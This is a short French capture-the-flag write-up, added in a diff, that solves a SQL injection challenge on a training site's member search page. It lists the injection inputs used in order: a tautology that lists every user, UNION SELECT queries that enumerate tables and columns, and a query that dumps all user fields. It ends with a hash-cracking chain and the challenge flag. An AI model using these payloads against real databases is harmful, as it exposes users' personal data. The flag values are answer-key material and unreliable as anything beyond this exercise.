@@ -1,0 +1,17 @@
+À partir de la page Members 'http://YOURADDRESSIP/index.php?page=member'
+
+On a une recherche de membre par ID qui interroge la BDD afin de nous afficher le nom et prenom du membre correspondant à l'ID.
+Le membre avec l'ID 5 se nomme 'GetThe Flag', c'est peut-etre un indice... ?, non je ne pense pas.
+
+On va essayer quelques requete SQL afin de voir si on peut recuperer plus d'informations.
+
+En mettant un espace a la place de l'ID, une erreur de syntaxe SQL nous dit que nous avons à faire à un serveur MySQL.
+Si on tape '1 or true' on obtient tous les utilisateurs listés.
+
+On continue l'injection en essayant de recuperer les tables de la BDD '-1 union select NULL, table_name from information_schema.tables where table_schema=database()'
+La table 'users' est presente, on essaye de recuperer maintenant les colonnes '-1 union select NULL, column_name from information_schema.columns where table_schema=database()'
+
+A present on peut essayer de recuperer les valeurs pour tous les users '-1 union select NULL, concat(user_id, first_name, last_name, town, country, planet, Commentaire, countersign) from users'
+On peut voir que le fameux GetThe Flag nous partage des instructions pour trouver le flag.
+
+5ff9d0165b4f92b14994e5c685cdce28 -> FortyTwo -> fortytwo -> 10A16D834F9B1E4068B25C4C46FE0284E99E44DCEAF08098FC83925BA6310FF5
